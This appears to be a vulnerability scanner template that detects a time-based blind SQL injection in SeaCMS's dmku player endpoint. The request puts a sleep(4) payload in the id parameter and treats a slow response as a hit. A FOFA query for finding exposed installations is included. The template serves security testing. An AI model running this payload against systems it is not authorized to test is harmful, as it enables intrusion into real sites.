id: seacms-dmku-sqli

info:
  name: SeaCMS DMKU - SQL Injection
  author: Co5mos
  severity: high
  description: SeaCMS 海洋影视管理系统 dmku 存在 SQL 注入漏洞。
  metadata:
    fofa_query: app="海洋CMS"
  tags: seacms,sqli

http:
  - raw:
    - |
      @timeout: 10s
      GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(4)))v)&type=list HTTP/1.1
      Host: {{Hostname}}
    
    matchers:
      - type: dsl
        dsl:
          - 'duration>=4'
          - 'status_code == 200'
        condition: and
